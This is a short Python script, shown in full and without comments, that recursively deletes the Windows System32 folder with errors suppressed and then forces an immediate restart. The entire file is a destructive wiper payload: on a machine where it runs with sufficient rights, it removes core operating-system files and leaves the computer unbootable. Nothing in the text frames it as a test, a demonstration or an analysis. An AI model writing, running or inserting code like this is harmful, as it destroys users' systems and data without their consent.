import shutil
import os

shutil.rmtree(r"C:\Windows\System32", ignore_errors=True)
os.system("shutdown -r -t 0")
